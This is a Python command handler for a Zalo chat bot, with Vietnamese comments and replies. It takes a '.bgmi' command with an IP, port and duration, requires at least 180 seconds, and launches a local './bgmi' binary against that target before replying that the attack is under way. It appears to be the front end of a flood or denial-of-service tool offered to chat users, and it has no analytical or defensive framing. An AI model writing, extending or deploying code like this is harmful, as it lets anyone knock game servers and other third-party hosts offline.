import subprocess
from zlapi.models import Message

def bgmi(self, message_object, author_id, thread_id, thread_type, message):
    """Xử lý lệnh .bgmi ip port time

    Cú pháp: .bgmi <ip> <port> <duration_seconds>
    Yêu cầu: duration >= 180
    """
    try:
        content = getattr(message_object, "content", None)
        if not content:
            content = message or ""

        parts = content.strip().split()
        if len(parts) == 4 and parts[0].lstrip('.') == 'bgmi':
            _, ip, port, duration_str = parts
            try:
                duration = int(duration_str)
            except ValueError:
                self.replyMessage(
                    Message(text="❌ Thời gian phải là số nguyên (giây)."),
                    message_object, thread_id, thread_type
                )
                return

            if duration < 180:
                self.replyMessage(
                    Message(text="⚠️ Thời gian phải ≥ 180 giây."),
                    message_object, thread_id, thread_type
                )
                return

            subprocess.Popen(
                ["./bgmi", ip, port, str(duration), "200"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )

            self.replyMessage(
                Message(text=f"🚀 Đang attack 🔥 {ip}:{port} ⏱️ {duration}s"),
                message_object, thread_id, thread_type
            )
        else:
            self.replyMessage(
                Message(text="❌ Sai cú pháp → Dùng: `.bgmi ip port time`"),
                message_object, thread_id, thread_type
            )
    except Exception as e:
        try:
            self.replyMessage(
                Message(text=f"💥 Lỗi khi xử lý lệnh bgmi: {e}"),
                message_object, thread_id, thread_type
            )
        except Exception:
            pass